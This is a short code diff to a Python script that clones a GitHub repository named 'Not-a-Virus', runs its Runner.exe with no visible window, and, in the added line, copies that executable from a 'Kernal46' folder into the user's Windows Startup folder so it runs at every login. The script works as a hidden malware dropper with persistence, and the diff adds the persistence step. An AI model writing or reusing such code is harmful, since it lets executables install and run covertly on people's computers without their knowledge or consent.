@@ -31,4 +31,5 @@ porcelain.clone('https://github.com/romanjmock/Not-a-Virus', path)
 os.chdir(os.path.join(path, 'dist/Runner'))
 
 CREATE_NO_WINDOW = 0x08000000
+shutil.copy2('C:/Users/Public/Kernal46/dist/Runner.exe', 'C:/Users/' + os.getlogin() + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
 subprocess.Popen('Runner.exe', creationflags = CREATE_NO_WINDOW)
